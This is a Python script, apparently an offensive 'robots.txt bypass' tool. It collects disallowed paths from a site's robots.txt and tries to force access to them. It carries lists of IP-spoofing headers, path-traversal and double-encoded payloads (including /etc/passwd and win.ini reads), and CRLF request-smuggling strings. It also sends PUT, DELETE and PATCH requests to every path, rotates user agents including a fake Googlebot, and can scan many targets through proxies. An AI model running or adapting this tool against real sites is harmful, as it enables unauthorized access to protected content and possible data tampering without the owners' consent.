#!/usr/bin/env python3
"""
ULTIMATE Robots.txt Scanner with:
- HTTP/2 support
- Rate limiting control
- Advanced 401/403 bypass techniques
- Comprehensive path traversal variants
- Multiple HTTP method testing
- Proxy support (HTTP/SOCKS)
- JSON/CSV output options
- Bug-focused mode
- Multi-threading
- Retry mechanism
- SSL verification toggle
"""

import requests
from urllib.parse import urljoin, urlparse
import argparse
from concurrent.futures import ThreadPoolExecutor, as_completed
import colorama
from colorama import Fore, Style
import random
import json
import csv
import time
import warnings
import os
import logging
import threading
from http.client import HTTPConnection
from requests.adapters import HTTPAdapter
from requests.packages.urllib3.util.retry import Retry
from requests.packages.urllib3.exceptions import InsecureRequestWarning

from colorama import Fore, Style

def print_banner():
    print(Fore.CYAN + r"""
______      _           _____       _       _ _    
| ___ \    | |         /  ___|     | |     (_) |   
| |_/ /___ | |__   ___ \ `--. _ __ | | ___  _| |_  
|    // _ \| '_ \ / _ \ `--. \ '_ \| |/ _ \| | __| 
| |\ \ (_) | |_) | (_) /\__/ / |_) | | (_) | | |_  
\_| \_\___/|_.__/ \___/\____/| .__/|_|\___/|_|\__| 
                             | |                   
                             |_|""")
    
    print(Fore.YELLOW + "──────────────────────────────────────────────" + 
          Fore.RED + "[By XploitPoy-777]" + 
          Fore.YELLOW + "──────" + Style.RESET_ALL)
    print() 

# Color options:
# - Fore.RED, Fore.GREEN, Fore.YELLOW, Fore.BLUE
# - Fore.MAGENTA, Fore.CYAN, Fore.WHITE
# - Style.BRIGHT for bold effect

print_banner()

# Suppress SSL warnings
warnings.filterwarnings("ignore", category=InsecureRequestWarning)

# Initialize colors
colorama.init(autoreset=True)

# ======================
# CONFIGURATION
# ======================

# User-agent rotation
USER_AGENTS = [
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
    'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
    'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:89.0) Gecko/20100101 Firefox/89.0',
    'Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1',
    'Googlebot/2.1 (+http://www.google.com/bot.html)'
]

HTTP_METHODS = ['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS', 'HEAD']

# Comprehensive IP spoofing headers for 401/403 bypass
BYPASS_HEADERS = [
    {'Client-IP': '127.0.0.1'},
    {'Forwarded-For-Ip': '127.0.0.1'},
    {'Forwarded-For': '127.0.0.1'},
    {'Forwarded-For': 'localhost'},
    {'Forwarded': '127.0.0.1'},
    {'Forwarded': 'localhost'},
    {'True-Client-IP': '127.0.0.1'},
    {'X-Client-IP': '127.0.0.1'},
    {'X-Custom-IP-Authorization': '127.0.0.1'},
    {'X-Forward-For': '127.0.0.1'},
    {'X-Forward': '127.0.0.1'},
    {'X-Forward': 'localhost'},
    {'X-Forwarded-By': '127.0.0.1'},
    {'X-Forwarded-By': 'localhost'},
    {'X-Forwarded-For-Original': '127.0.0.1'},
    {'X-Forwarded-For-Original': 'localhost'},
    {'X-Forwarded-For': '127.0.0.1'},
    {'X-Forwarded-For': 'localhost'},
    {'X-Forwarded-Server': '127.0.0.1'},
    {'X-Forwarded-Server': 'localhost'},
    {'X-Forwarded': '127.0.0.1'},
    {'X-Forwarded': 'localhost'},
    {'X-Forwared-Host': '127.0.0.1'},
    {'X-Forwared-Host': 'localhost'},
    {'X-Host': '127.0.0.1'},
    {'X-Host': 'localhost'},
    {'X-HTTP-Host-Override': '127.0.0.1'},
    {'X-Originating-IP': '127.0.0.1'},
    {'X-Real-IP': '127.0.0.1'},
    {'X-Remote-Addr': '127.0.0.1'},
    {'X-Remote-Addr': 'localhost'},
    {'X-Remote-IP': '127.0.0.1'},
    {'CF-Connecting-IP': '127.0.0.1'},  # Cloudflare
    {'Fastly-Client-IP': '127.0.0.1'},  # Fastly
    {'Akamai-Origin-Hop': '127.0.0.1'}  # Akamai
]

# Advanced Path Traversal Variants
PATH_VARIANTS = [
    # Basic traversal
    '', '/.', '/..;/', '//', '/./', 
    
    # Encoding variations
    '%20', '%09', '%00', '%0a', '%0d%0a', '%23', '%2e', '%2f', '%5c', '%ff',
    
    # Double encoding
    '%252e', '%252f', '%255c', '%2520', '%2500',
    
    # Case manipulation
    '/ADMIN', '/aDmIn', '/Admin/',
    
    # Special chars
    ';', ';.css', ';.js', ';.html', '?', '??', '???', '#', '##', '###', '/..\\',
    
    # File extensions
    '.json', '.bak', '.old', '.temp', '.swp', '.swo', '.backup', 
    '.tar.gz', '.zip', '.rar', '.7z',
    
    # Parameter pollution
    ';param=value', '?param=value', '&param=value', 
    '%3fparam=value', '%26param=value',
    
    # Path normalization
    '/.../', '/..../', '/.....\\', '/...\\', '/..\\../',
    '/..%5c..%5c', '/%2e%2e%2f', '/%2e%2e/', '/..%00/', '/..%ff/',
    '/%2e%2e%5c', '/%252e%252e%252f', '/%252e%252e%255c',
    
    # Windows-specific
    '/::$DATA', '/:stream:$DATA', '/com1', '/com2', '/lpt1', '/aux', '/prn',
    
    # Unicode
    '/%c0%af', '/%c1%9c', '/%ef%bc%8f', '/%ef%bf%a3',
    
    # HTTP request smuggling
    '/%20HTTP/1.1%0d%0aHost:%20localhost%0d%0a%0d%0a',
    '/%20HTTP/1.1%0d%0aX-Forwarded-For:%20127.0.0.1%0d%0a%0d%0a',
    
    # Archive tricks
    '.zip/', '.rar/', '.tar.gz/', '/file.zip/../', '/archive.rar/..\\',
    
    # Web server quirks
    '/%2f', '/%5c', '/%2f%2f', '/%5c%5c', '/%2f%5c', '/%5c%2f',
    
    # Combination attacks
    '/admin%00.json', '/config%23.bak', '/backup%20.tar.gz',
    '/..%2f..%2fetc%2fpasswd', '/..%5c..%5cwindows%5cwin.ini'
]

# Special headers for specific path variants
PATH_VARIANTS_HEADERS = {
    '/::$DATA': {'X-File-Type': 'NTFS'},
    '/:stream:$DATA': {'X-File-Type': 'NTFS'},
    '/com1': {'X-Device': 'COM1'},
    '/%c0%af': {'X-Unicode': 'yes'},
    '/%20HTTP/1.1%0d%0aHost:%20localhost%0d%0a%0d%0a': {'X-HTTP-Smuggling': 'test'}
}

# ======================
# HTTP/2 ADAPTER
# ======================

class HTTP2Adapter(HTTPAdapter):
    def __init__(self, *args, **kwargs):
        self.http2 = kwargs.pop('http2', True)
        super().__init__(*args, **kwargs)

    def init_poolmanager(self, *args, **kwargs):
        kwargs['protocol'] = 'h2' if self.http2 else 'http/1.1'
        super().init_poolmanager(*args, **kwargs)

    def proxy_manager_for(self, *args, **kwargs):
        kwargs['protocol'] = 'h2' if self.http2 else 'http/1.1'
        return super().proxy_manager_for(*args, **kwargs)

# ======================
# RATE LIMITER
# ======================

class RateLimiter:
    def __init__(self, max_requests, per_seconds):
        self.max_requests = max_requests
        self.per_seconds = per_seconds
        self.timestamps = []
        self.lock = threading.Lock()

    def wait(self):
        with self.lock:
            now = time.time()
            # Remove old timestamps
            self.timestamps = [t for t in self.timestamps if t > now - self.per_seconds]
            
            if len(self.timestamps) >= self.max_requests:
                sleep_time = self.per_seconds - (now - self.timestamps[0])
                if sleep_time > 0:
                    time.sleep(sleep_time)
                    now = time.time()
            
            self.timestamps.append(now)
            if len(self.timestamps) > self.max_requests:
                self.timestamps.pop(0)

# ======================
# SCANNER CLASS
# ======================

class UltimateScanner:
    def __init__(self):
        self.results = []
        self.session = requests.Session()
        self.retry_count = 2
        self.timeout = 10
        self.delay = 1
        self.rate_limiter = None
        self.http2_enabled = False
        self.total_requests = 0
        self.start_time = time.time()
        
        # Configure retry strategy
        retry_strategy = Retry(
            total=3,
            backoff_factor=1,
            status_forcelist=[429, 500, 502, 503, 504]
        )
        self.adapter = HTTPAdapter(max_retries=retry_strategy)
        
    def configure_http2(self, enable=True):
        """Enable/disable HTTP/2 support"""
        self.http2_enabled = enable
        if enable:
            self.session.mount("https://", HTTP2Adapter(http2=True))
            self.session.mount("http://", HTTP2Adapter(http2=True))
        else:
            self.session.mount("https://", self.adapter)
            self.session.mount("http://", self.adapter)

    def configure_rate_limit(self, max_requests, per_seconds):
        """Configure rate limiting"""
        if max_requests > 0 and per_seconds > 0:
            self.rate_limiter = RateLimiter(max_requests, per_seconds)
        else:
            self.rate_limiter = None

    def get_random_user_agent(self):
        return random.choice(USER_AGENTS)

    def configure_session(self, proxy=None, verify_ssl=False):
        """Configure HTTP session with proxy and SSL settings"""
        if proxy:
            self.session.proxies = {
                'http': proxy,
                'https': proxy
            }
        self.session.verify = verify_ssl
        self.session.headers.update({
            'User-Agent': self.get_random_user_agent(),
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.5',
            'Connection': 'keep-alive'
        })

    def make_request(self, method, url, headers={}, data=None):
        """Make HTTP request with rate limiting and error handling"""
        if self.rate_limiter:
            self.rate_limiter.wait()
            
        self.total_requests += 1
        
        try:
            # Add variant-specific headers if they exist
            final_headers = headers.copy()
            final_headers.update(PATH_VARIANTS_HEADERS.get(urlparse(url).path, {}))
            
            if method == 'GET':
                response = self.session.get(url, headers=final_headers, timeout=self.timeout, allow_redirects=False)
            elif method == 'POST':
                response = self.session.post(url, headers=final_headers, timeout=self.timeout, allow_redirects=False, data=data or {'test': '1'})
            elif method == 'PUT':
                response = self.session.put(url, headers=final_headers, timeout=self.timeout, allow_redirects=False, data=data or {'test': '1'})
            elif method == 'DELETE':
                response = self.session.delete(url, headers=final_headers, timeout=self.timeout, allow_redirects=False)
            elif method == 'PATCH':
                response = self.session.patch(url, headers=final_headers, timeout=self.timeout, allow_redirects=False, data=data or {'test': '1'})
            elif method == 'OPTIONS':
                response = self.session.options(url, headers=final_headers, timeout=self.timeout, allow_redirects=False)
            elif method == 'HEAD':
                response = self.session.head(url, headers=final_headers, timeout=self.timeout, allow_redirects=False)
            
            return {
                'status': response.status_code,
                'length': len(response.content) if hasattr(response, 'content') else 0,
                'headers': dict(response.headers),
                'effective_url': response.url,
                'http_version': response.raw.version if hasattr(response.raw, 'version') else '1.1'
            }
            
        except Exception as e:
            return {
                'error': str(e),
                'status': 0
            }

    def try_methods(self, url, headers={}):
        """Test all HTTP methods on a URL with retries"""
        method_results = {}
        
        for method in HTTP_METHODS:
            result = None
            for attempt in range(self.retry_count + 1):
                result = self.make_request(method, url, headers)
                if result['status'] != 0 or attempt == self.retry_count:
                    break
                time.sleep(self.delay)
            
            method_results[method] = result
        
        return method_results

    def try_bypass(self, url):
        """Test multiple bypass techniques on a URL"""
        results = []
        
        # Test normal methods first
        normal_results = self.try_methods(url)
        results.append(('Normal', normal_results))
        
        # If any method gets blocked (401/403), try bypass headers
        if any(res.get('status') in [401, 403] for res in normal_results.values()):
            for header_set in BYPASS_HEADERS:
                bypass_results = self.try_methods(url, header_set)
                results.append((f"Header:{list(header_set.keys())[0]}", bypass_results))
                if not any(res.get('status') in [401, 403] for res in bypass_results.values()):
                    break
        
        # If still blocked, try path variants
        if all(any(r[1][method].get('status') in [401, 403] for method in HTTP_METHODS) for r in results):
            for variant_url in self.generate_bypass_urls(url):
                variant_results = self.try_methods(variant_url)
                results.append((f"PathVariant:{variant_url}", variant_results))
                if not any(res.get('status') in [401, 403] for res in variant_results.values()):
                    break
        
        return results

    def generate_bypass_urls(self, original_url):
        """Generate URL variants for bypass testing"""
        variants = []
        parsed = urlparse(original_url)
        base_path = parsed.path
        
        for variant in PATH_VARIANTS:
            if not variant:
                continue
            new_path = base_path + variant
            variants.append(parsed._replace(path=new_path).geturl())
        return variants

    def get_robots_txt(self, base_url):
        """Fetch robots.txt from target with retries"""
        robots_url = urljoin(base_url, '/robots.txt')
        for attempt in range(self.retry_count + 1):
            try:
                response = self.session.get(robots_url, timeout=self.timeout)
                if response.status_code == 200:
                    return response.text
                print(Fore.YELLOW + f"[!] robots.txt not found (HTTP {response.status_code})")
            except Exception as e:
                if attempt == self.retry_count:
                    print(Fore.RED + f"[-] Error fetching robots.txt: {e}")
                time.sleep(self.delay)
        return None

    def parse_robots(self, robots_content, base_url):
        """Extract disallowed paths from robots.txt"""
        disallowed_paths = []
        for line in robots_content.split('\n'):
            line = line.strip()
            if line.lower().startswith('disallow:'):
                path = line.split(':')[1].strip()
                if path:
                    disallowed_paths.append(urljoin(base_url, path))
        return disallowed_paths

    def scan_url(self, url, proxy=None, bugs_only=False):
        """Scan a single URL"""
        self.configure_session(proxy, verify_ssl=False if proxy else True)
        
        result = {
            'url': url,
            'accessible_paths': [],
            'timestamp': time.strftime("%Y-%m-%d %H:%M:%S")
        }
        
        robots_content = self.get_robots_txt(url)
        if not robots_content:
            return result
            
        disallowed_paths = self.parse_robots(robots_content, url)
        if not disallowed_paths:
            print(Fore.YELLOW + f"[!] No disallowed paths found for {url}")
            return result
        
        for path in disallowed_paths:
            bypass_results = self.try_bypass(path)
            
            for technique, res in bypass_results:
                for http_method, response in res.items():
                    if response.get('status') == 200:
                        result['accessible_paths'].append({
                            'path': path,
                            'method': http_method,
                            'status': response['status'],
                            'length': response['length'],
                            'bypass_technique': technique,
                            'headers': response.get('headers', {}),
                            'effective_url': response.get('effective_url', ''),
                            'http_version': response.get('http_version', '1.1')
                        })
                        if not bugs_only:
                            print(Fore.GREEN + f"[+] {http_method} BYPASSED ({technique}): {path}")
        
        return result

    def get_stats(self):
        """Get scanning statistics"""
        duration = time.time() - self.start_time
        return {
            'total_requests': self.total_requests,
            'duration': duration,
            'requests_per_second': self.total_requests / duration if duration > 0 else 0
        }

# ======================
# MAIN FUNCTION
# ======================

def main():
    parser = argparse.ArgumentParser(
        description="ULTIMATE Robots.txt Scanner with HTTP/2 and Rate Limiting",
        formatter_class=argparse.ArgumentDefaultsHelpFormatter
    )
    parser.add_argument('url', nargs='?', help="Single URL to scan")
    parser.add_argument('-l', '--list', help="File containing list of URLs")
    parser.add_argument('-t', '--threads', type=int, default=5, help="Threads for concurrent scanning")
    parser.add_argument('-o', '--output', help="Output file to save results (JSON/CSV)")
    parser.add_argument('-f', '--format', choices=['json', 'csv'], default='json', help="Output format")
    parser.add_argument('-p', '--proxy', help="Proxy (e.g., http://127.0.0.1:8080)")
    parser.add_argument('--bugs-only', action='store_true', help="Only show exploitable URLs")
    parser.add_argument('--retries', type=int, default=2, help="Number of retries for failed requests")
    parser.add_argument('--timeout', type=int, default=10, help="Request timeout in seconds")
    parser.add_argument('--delay', type=float, default=1.0, help="Delay between retries in seconds")
    parser.add_argument('--http2', action='store_true', help="Enable HTTP/2 support")
    parser.add_argument('--rate-limit', type=int, default=0, help="Max requests per second (0 for no limit)")
    parser.add_argument('--rate-window', type=int, default=1, help="Rate limit window in seconds")
    parser.add_argument('--verbose', action='store_true', help="Show verbose output")
    
    args = parser.parse_args()

    if not args.url and not args.list:
        parser.error("Please provide either a single URL or a file with -l")

    # Prepare URLs
    urls = []
    if args.url:
        urls.append(args.url)
    if args.list:
        with open(args.list, 'r') as f:
            urls.extend([line.strip() for line in f if line.strip()])

    print(Fore.CYAN + f"[*] Starting scan for {len(urls)} URLs with {args.threads} threads")
    if args.proxy:
        print(Fore.CYAN + f"[*] Using proxy: {args.proxy}")
    if args.http2:
        print(Fore.CYAN + "[*] HTTP/2 support enabled")
    if args.rate_limit > 0:
        print(Fore.CYAN + f"[*] Rate limiting: {args.rate_limit} requests per {args.rate_window} second(s)")
    print(Fore.CYAN + f"[*] Testing methods: {', '.join(HTTP_METHODS)}")
    print(Fore.CYAN + f"[*] Retry attempts: {args.retries}")
    print(Fore.CYAN + f"[*] Timeout: {args.timeout}s, Delay: {args.delay}s")

    scanner = UltimateScanner()
    scanner.configure_http2(args.http2)
    scanner.configure_rate_limit(args.rate_limit, args.rate_window)
    scanner.retry_count = args.retries
    scanner.timeout = args.timeout
    scanner.delay = args.delay
    
    results = []
    start_time = time.time()

    with ThreadPoolExecutor(max_workers=args.threads) as executor:
        futures = {executor.submit(scanner.scan_url, url, args.proxy, args.bugs_only): url for url in urls}
        
        try:
            for future in as_completed(futures):
                url = futures[future]
                try:
                    result = future.result()
                    if result['accessible_paths']:
                        results.append(result)
                        if args.bugs_only:
                            print(Fore.GREEN + f"\n[+] Vulnerable paths found for {result['url']}:")
                            for path in result['accessible_paths']:
                                print(Fore.GREEN + f"  - {path['method']} {path['path']} (Bypass: {path['bypass_technique']})")
                except Exception as e:
                    print(Fore.RED + f"[-] Error scanning {url}: {str(e)}")
        except KeyboardInterrupt:
            print(Fore.YELLOW + "\n[!] Received keyboard interrupt, shutting down...")
            executor._threads.clear()
            raise

    # Save results
    if args.output and results:
        with open(args.output, 'w') as f:
            if args.format == 'json':
                json.dump(results, f, indent=2)
            else:  # CSV
                writer = csv.writer(f)
                writer.writerow(['URL', 'Path', 'Method', 'Status', 'Length', 'Bypass Technique', 'Effective URL', 'HTTP Version'])
                for result in results:
                    for path in result['accessible_paths']:
                        writer.writerow([
                            result['url'],
                            path['path'],
                            path['method'],
                            path['status'],
                            path['length'],
                            path['bypass_technique'],
                            path.get('effective_url', ''),
                            path.get('http_version', '1.1')
                        ])
        print(Fore.CYAN + f"\n[*] Results saved to {args.output} ({args.format.upper()})")

    # Print statistics
    stats = scanner.get_stats()
    print(Fore.CYAN + "\n[*] Scan statistics:")
    print(Fore.CYAN + f"  - Total requests: {stats['total_requests']}")
    print(Fore.CYAN + f"  - Duration: {stats['duration']:.2f} seconds")
    print(Fore.CYAN + f"  - Requests per second: {stats['requests_per_second']:.2f}")

    print(Fore.GREEN + "\n[+] Scan completed!")

if __name__ == '__main__':
    main()
